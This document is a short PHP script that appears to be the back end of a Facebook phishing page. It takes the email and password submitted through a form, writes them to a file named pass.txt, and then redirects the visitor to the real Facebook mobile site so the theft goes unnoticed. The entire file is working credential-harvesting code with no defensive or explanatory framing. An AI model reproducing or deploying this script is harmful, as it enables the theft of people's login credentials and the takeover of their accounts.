<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$file = "pass.txt";
$texto = "email: " .$email . '   ' . "password: " .$pass ;
$fp = fopen($file, "w");
fwrite($fp, $texto);
fclose($fp);
	header('Location: https://m.facebook.com/');

?>



